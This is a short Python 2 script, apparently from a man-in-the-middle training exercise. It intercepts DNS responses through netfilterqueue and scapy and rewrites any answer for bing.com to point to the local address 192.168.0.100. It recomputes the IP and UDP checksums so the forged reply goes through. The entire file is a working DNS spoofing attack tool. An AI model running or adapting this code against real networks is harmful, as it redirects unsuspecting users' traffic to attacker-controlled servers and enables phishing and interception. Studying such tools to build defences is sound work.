#!/usr/bin/env python2

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # is this a DNS packet?
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())

        # is this a DNS request for bing.com?
        qname = scapy_packet[scapy.DNSQR].qname
        if "bing.com" in qname:
            # answer with our IP
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.100")

            # modify DNS response answer
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete fields that need recomputation (done by scapy)
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
            print(scapy_packet.show)

    # Forward the packet. packet.drop() to drop the packet
    packet.accept()

# Create netfilerqueue object
queue = netfilterqueue.NetfilterQueue()

# Bind to iptables queue number 0 and callback process_packet() to be
# executed for each packet in the queue
queue.bind(0, process_packet)
queue.run()
